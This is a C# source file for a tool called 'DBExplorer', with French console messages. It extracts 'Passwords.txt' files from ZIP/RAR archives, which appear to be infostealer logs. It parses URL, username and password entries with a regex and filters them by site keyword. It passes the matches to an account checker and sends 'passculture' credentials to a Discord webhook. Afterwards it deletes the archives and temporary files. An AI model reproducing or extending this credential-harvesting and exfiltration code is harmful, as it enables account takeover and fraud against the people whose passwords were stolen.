﻿using System.Text.RegularExpressions;
using Ionic.Zip;
using SharpCompress.Archives;
using SharpCompress.Archives.Rar;
using SharpCompress.Common;
using ColorfulConsole = Colorful.Console;

namespace DBExplorer
{
    public static class DBExplorer
    {
        private static DateTime startTime;

        public static void Run(string archivePath)
        {
            PrintBanner();
            Console.WriteLine(archivePath);
            if (!File.Exists(archivePath))
            {
                System.Console.WriteLine("Archive spécifiée non trouvée.");
                return;
            }

            Console.WriteLine();
            string archiveName = Path.GetFileName(archivePath); // Obtenez le nom de l'archive
            Console.ForegroundColor = ConsoleColor.Red;
            System.Console.WriteLine($"Archive détectée: {archiveName}");
            Console.ResetColor();

            startTime = DateTime.Now; // Save the start time before extraction

            string directoryPath = @"dbdtemp";

            if (!Directory.Exists(directoryPath))
            {
                // If it doesn't exist, create it
                Directory.CreateDirectory(directoryPath);
                Console.WriteLine("Création de dbdtemp.");
            }

            try
            {
                ExtractArchive(archivePath, "dbdtemp");
            }
            catch (FormatException ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Erreur lors de l'extraction de l'archive {archiveName}: {ex.Message}");
                Console.ResetColor();
            }
            catch (InvalidFormatException ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Erreur lors de l'extraction de l'archive {archiveName}: {ex.Message}");
                Console.ResetColor();
            }
            catch (System.OverflowException ex)
            {
                // Handle the exception
                Console.WriteLine("Une exception de dépassement de capacité s'est produite : " + ex.Message);
                Console.WriteLine($"StackTrace: {ex.StackTrace}");
                // You can add further error handling or logging here if needed
            }
            catch (SharpCompress.Common.CryptographicException ex)
            {
                // Handle the exception
                Console.WriteLine("Problème concernant l'archive : " + ex.Message);
                // You can add further error handling or logging here if needed
            }
            catch (System.IndexOutOfRangeException ex)
            {
                Console.WriteLine("Problème concernant l'archive : " + ex.Message);
            }
            catch (System.InvalidOperationException ex)
            {
                Console.WriteLine("Problème concernant l'archive : " + ex.Message);
            }
            catch (System.UnauthorizedAccessException ex)
            {
                Console.WriteLine("Problème concernant l'archive : " + ex.Message);

            }


            var results = FindPasswords();

            foreach (var keyword in DataVortex.keywords.UrlChecker.Keywords.List.Keys)
            {
                if (results.ContainsKey(keyword) && results[keyword].Count > 0)
                {
                    if (keyword == "passculture")
                    {
                        DataVortex.keywords.UrlChecker.Keywords.SendToDiscordWebhookPassculture(
                            results[keyword],
                            DataVortex.keywords.UrlChecker.Keywords.List[keyword],
                            archiveName, // Utilisez le nom de l'archive
                            DataVortex.Checker.BirthDate,
                            DataVortex.Checker.Remaining1
                        ).Wait();
                    }
                }
            }

                File.Delete(archivePath); // Supprimez le fichier d'archive actuellement traité

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Fin de l'archive {archiveName}.");
                Console.ResetColor();

            // Supprimer le contenu du répertoire dbdtemp
            if (Directory.Exists("dbdtemp"))
            {
                DirectoryInfo directory = new DirectoryInfo("dbdtemp");
                foreach (FileInfo file in directory.GetFiles())
                {
                    file.Delete();
                }
                foreach (DirectoryInfo subDirectory in directory.GetDirectories())
                {
                    subDirectory.Delete(true);
                }

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Contenu de dbdtemp supprimé avec succès.");
                Console.WriteLine("Suppressions des logs dans 5 secondes...");
                System.Threading.Thread.Sleep(5000);
                Console.ResetColor();

                Startconsole();
            }
        }

        public static async Task Startconsole()
        { 
            Console.WriteLine("\u001b[2J\u001b[3J");
            Console.SetCursorPosition(0, 0);
            PrintBanner();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine();
            Telegram.LogMessage("Prêt à télécharger la prochaine archive");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Telegram.LogMessage("Appuyez sur une touche pour arrêter le programme.");
            Console.ResetColor();
            Console.WriteLine();
        }


        private static void PrintBanner()
        {
            ColorfulConsole.WriteLine(Figgle.FiggleFonts.Standard.Render("DBExplorer"));
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("V1.8.5");
            Console.ResetColor();
        }

        private static void ExtractArchive(string filename, string output_path)
        {
            // Vérifie si le fichier est une archive supportée
            if (IsArchiveFile(filename))
            {
                // Ouvre l'archive à l'aide de la bibliothèque externe
                using (var archive = ArchiveFactory.Open(filename))
                {
                    // Parcourt chaque entrée dans l'archive
                    foreach (var entry in archive.Entries)
                    {
                        // Vérifie si l'entrée est un fichier et correspond aux critères
                        if (!entry.IsDirectory && (entry.Key.EndsWith("Passwords.txt") || entry.Key.EndsWith("All Passwords.txt")))
                        {
                            // Obtient le chemin relatif de l'entrée
                            string relativePath = entry.Key;

                            // Compose le chemin complet de sortie en combinant le chemin de sortie spécifié avec le chemin relatif de l'entrée
                            string outputPath = Path.GetFullPath(Path.Combine(output_path, relativePath));

                            // Obtient le chemin du répertoire de sortie
                            string outputDirPath = Path.GetDirectoryName(outputPath) ?? Path.Combine(output_path, "default");

                            // Crée le répertoire de sortie s'il n'existe pas déjà
                            Directory.CreateDirectory(outputDirPath);

                            // Extrait le fichier vers le chemin de sortie avec les options d'extraction spécifiées
                            entry.WriteToFile(outputPath, new ExtractionOptions { ExtractFullPath = true, Overwrite = true });
                        }
                    }
                }
            }
            else
            {
                // Affiche un message d'erreur si le format de l'archive n'est pas pris en charge
                ColorfulConsole.WriteLine("Erreur : format d'archive non pris en charge", System.Drawing.Color.Blue);
                Console.ResetColor();

                // Supprime le fichier d'archive en cas d'erreur
                File.Delete(filename);
            }
        }


        private static bool IsArchiveFile(string filename)
        {
            return ZipFile.IsZipFile(filename) || RarArchive.IsRarFile(filename);
        }

        public static Dictionary<string, List<(string urlOrHost, string username, string password, string app)>> FindPasswords()
        {
            var results = new Dictionary<string, List<(string urlOrHost, string username, string password, string app)>>();
            var directoryPath = "dbdtemp";
            var files = Directory.GetFiles(directoryPath, "Passwords.txt", SearchOption.AllDirectories);

            foreach (var file in files)
            {
                var contents = File.ReadAllText(file);
                var matches = Regex.Matches(contents, @"(URL|Host):\s*(.*?)\nUsername:\s*(.*?)\nPassword:\s*(.*?)\nApplication:\s*(.*?)\n=*");

                foreach (Match match in matches)
                {
                    var urlOrHost = match.Groups[2].Value.Trim();
                    var username = match.Groups[3].Value.Trim();
                    var password = match.Groups[4].Value.Trim();
                    var app = match.Groups[5].Value.Trim();

                    foreach (var keyword in DataVortex.keywords.UrlChecker.Keywords.List.Keys)
                    {
                        if (urlOrHost.Contains(keyword))
                        {
                            var result = (urlOrHost, username, password, app);

                            DataVortex.Checker.HandleAccount(keyword, result);

                            if (!results.ContainsKey(keyword))
                            {
                                results[keyword] = new List<(string urlOrHost, string username, string password, string app)>();
                            }
                            results[keyword].Add(result);
                        }
                    }
                }
            }

            return results;
        }
    }
}
